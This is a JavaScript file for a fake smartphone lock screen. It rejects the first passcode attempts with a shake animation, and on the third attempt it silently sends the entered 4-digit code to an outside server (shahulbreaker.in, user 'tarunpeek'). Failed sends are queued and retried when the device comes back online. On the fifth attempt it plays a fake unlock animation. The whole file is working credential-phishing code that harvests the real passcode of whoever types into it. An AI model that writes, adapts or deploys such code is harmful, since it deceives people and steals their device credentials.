(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 4; // matches your HTML (4 dots)
  let code = "";

  // Elements
  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const homescreenImg = document.getElementById('homescreenImg');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';

  // attempts storage
  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  // update dots UI
  function refreshDots() {
    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
  }

  // clear the current code input
  function reset() {
    code = "";
    refreshDots();
  }

  // queue on failed send
  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  // send to API (used only on 3rd attempt). returns promise.
  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        queuePass(pass);
        // still resolve so caller doesn't hang
      });
  }

  // flush any queued passes when online
  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  // play unlock animation
  function playUnlockAnimation() {
    const lockEl = document.querySelector('.lockscreen');
    if (!lockEl || !unlockOverlay) return;
    lockEl.classList.add('unlocking');
    unlockOverlay.classList.add('show');
  }

  // animate wrong attempt: dots turn red + shake; reset AFTER animation
  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    const lockEl = document.querySelector('.lockscreen');
    if (!dotsEl) {
      reset();
      return;
    }

    const DURATION = 620; // must match CSS animation duration

    dotsEl.classList.add('wrong');
    lockEl && lockEl.classList.add('shake');

    // remove classes and clear input after animation ends
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
      lockEl && lockEl.classList.remove('shake');
      reset();
    }, DURATION + 20);
  }

  // Called after a full entry
  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    // send only on 3rd attempt
    if (attempts === 3) {
      // fire-and-forget; errors queue internally
      sendToAPI(enteredCode);
      animateWrongAttempt();
    } else if (attempts === 5) {
      // open phone (play animation) on 5th attempt
      playUnlockAnimation();
      // clear dots shortly later so UI is neat (allow animation to show)
      setTimeout(reset, 300);
    } else {
      // attempts 1,2,4 -> show wrong animation
      animateWrongAttempt();
    }

    // reset attempt counter after 5th so cycle repeats
    if (attempts >= 5) {
      setAttempts(0);
    }
  }

  // numeric key handling
  keys.forEach(k => k.addEventListener('click', () => {
    const num = k.dataset.num;
    if (!num) return;
    if (code.length >= MAX) return;
    code += num;
    refreshDots();

    if (code.length === MAX) {
      const enteredCode = code;
      // let the last dot visually fill, then handle attempt
      setTimeout(() => {
        handleCompleteAttempt(enteredCode);
        // DO NOT call reset() here — animations will call reset after they finish
      }, 120);
    }
  }));

  // emergency: visual only
  emergency && emergency.addEventListener('click', e => e.preventDefault());

  // cancel clears input immediately
  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });

  window.addEventListener('online', flushQueue);
  flushQueue();

  // expose for debug
  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };

})();
